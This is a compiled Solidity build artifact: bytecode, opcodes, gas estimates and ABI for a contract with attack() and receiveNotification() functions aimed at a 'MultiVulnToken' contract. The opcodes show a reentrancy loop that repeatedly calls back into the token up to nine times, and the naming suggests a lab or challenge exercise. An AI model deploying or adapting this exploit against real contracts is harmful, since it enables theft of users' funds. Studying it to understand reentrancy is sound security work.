{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "6080604052600060025534801561001557600080fd5b506040516105cb3803806105cb83398181016040528101906100379190610160565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050506101a0565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ef826100c4565b9050919050565b6000610101826100e4565b9050919050565b610111816100f6565b811461011c57600080fd5b50565b60008151905061012e81610108565b92915050565b61013d816100e4565b811461014857600080fd5b50565b60008151905061015a81610134565b92915050565b60008060408385031215610177576101766100bf565b5b60006101858582860161011f565b92505060206101968582860161014b565b9150509250929050565b61041c806101af6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c8063050cee9b1461004657806385892c24146100645780639e5faafc14610080575b600080fd5b61004e61008a565b60405161005b91906102b0565b60405180910390f35b61007e60048036038101906100799190610306565b6100ae565b005b610088610182565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6009600254101561017f57600260008154809291906100cc90610362565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633d0a4061600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161014c91906103cb565b600060405180830381600087803b15801561016657600080fd5b505af115801561017a573d6000803e3d6000fd5b505050505b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633d0a4061600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016101fd91906103cb565b600060405180830381600087803b15801561021757600080fd5b505af115801561022b573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061027661027161026c84610231565b610251565b610231565b9050919050565b60006102888261025b565b9050919050565b600061029a8261027d565b9050919050565b6102aa8161028f565b82525050565b60006020820190506102c560008301846102a1565b92915050565b600080fd5b6000819050919050565b6102e3816102d0565b81146102ee57600080fd5b50565b600081359050610300816102da565b92915050565b60006020828403121561031c5761031b6102cb565b5b600061032a848285016102f1565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061036d826102d0565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361039f5761039e610333565b5b600182019050919050565b60006103b582610231565b9050919050565b6103c5816103aa565b82525050565b60006020820190506103e060008301846103bc565b9291505056fea26469706673582212200f39e2ea5dce7f71281d2c43349c5300237a27f371f4f394d867760a0610101364736f6c63430008120033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x15 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x5CB CODESIZE SUB DUP1 PUSH2 0x5CB DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x37 SWAP2 SWAP1 PUSH2 0x160 JUMP JUMPDEST DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x1A0 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xEF DUP3 PUSH2 0xC4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x101 DUP3 PUSH2 0xE4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x111 DUP2 PUSH2 0xF6 JUMP JUMPDEST DUP2 EQ PUSH2 0x11C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x12E DUP2 PUSH2 0x108 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x13D DUP2 PUSH2 0xE4 JUMP JUMPDEST DUP2 EQ PUSH2 0x148 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x15A DUP2 PUSH2 0x134 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x177 JUMPI PUSH2 0x176 PUSH2 0xBF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x185 DUP6 DUP3 DUP7 ADD PUSH2 0x11F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x196 DUP6 DUP3 DUP7 ADD PUSH2 0x14B JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x41C DUP1 PUSH2 0x1AF PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x50CEE9B EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x85892C24 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x80 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x8A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x2B0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x79 SWAP2 SWAP1 PUSH2 0x306 JUMP JUMPDEST PUSH2 0xAE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x88 PUSH2 0x182 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x9 PUSH1 0x2 SLOAD LT ISZERO PUSH2 0x17F JUMPI PUSH1 0x2 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xCC SWAP1 PUSH2 0x362 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3D0A4061 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x14C SWAP2 SWAP1 PUSH2 0x3CB JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x166 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x17A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3D0A4061 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1FD SWAP2 SWAP1 PUSH2 0x3CB JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x217 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x22B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x276 PUSH2 0x271 PUSH2 0x26C DUP5 PUSH2 0x231 JUMP JUMPDEST PUSH2 0x251 JUMP JUMPDEST PUSH2 0x231 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x288 DUP3 PUSH2 0x25B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x29A DUP3 PUSH2 0x27D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AA DUP2 PUSH2 0x28F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C5 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2A1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x2D0 JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x300 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x31C JUMPI PUSH2 0x31B PUSH2 0x2CB JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x32A DUP5 DUP3 DUP6 ADD PUSH2 0x2F1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x36D DUP3 PUSH2 0x2D0 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x39F JUMPI PUSH2 0x39E PUSH2 0x333 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3B5 DUP3 PUSH2 0x231 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3C5 DUP2 PUSH2 0x3AA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3E0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3BC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF CODECOPY 0xE2 0xEA 0x5D 0xCE PUSH32 0x71281D2C43349C5300237A27F371F4F394D867760A0610101364736F6C634300 ADDMOD SLT STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "210400",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "infinite",
				"multiVulnToken()": "infinite",
				"receiveNotification(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"multiVulnToken()": "050cee9b",
			"receiveNotification(uint256)": "85892c24"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "contract MultiVulnToken",
					"name": "_multiVulnToken",
					"type": "address"
				},
				{
					"internalType": "address",
					"name": "__to",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "multiVulnToken",
			"outputs": [
				{
					"internalType": "contract MultiVulnToken",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"name": "receiveNotification",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}